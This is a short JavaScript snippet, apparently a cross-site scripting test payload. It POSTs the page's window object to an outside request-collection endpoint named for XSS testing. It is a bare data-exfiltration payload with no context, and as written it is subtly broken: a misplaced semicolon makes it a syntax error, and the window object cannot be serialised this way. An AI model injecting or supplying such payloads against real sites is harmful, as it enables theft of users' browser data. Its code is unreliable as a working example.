fetch('https://br4ck3r.free.beeceptor.com/xss-test', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	body: JSON.stringify({ data: window });
});
